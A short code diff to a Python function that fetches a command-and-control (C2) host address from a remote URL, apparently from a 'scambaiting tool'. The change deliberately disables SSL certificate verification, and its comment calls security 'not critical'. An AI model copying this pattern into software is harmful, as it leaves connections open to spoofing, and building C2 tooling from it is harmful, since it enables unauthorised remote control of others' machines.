@@ -167,7 +167,12 @@ def get_c2_host():
     try:
         log(f"Fetching C2 configuration from: {CONFIG_URL}")
 
-        with urllib.request.urlopen(CONFIG_URL, timeout=10) as response:
+        # Disable SSL verification for compatibility (scambaiting tool - security not critical)
+        import ssl
+
+        context = ssl._create_unverified_context()
+
+        with urllib.request.urlopen(CONFIG_URL, timeout=10, context=context) as response:
             c2_ip = response.read().decode("utf-8").strip()
 
             # Use the fetched IP if it has content
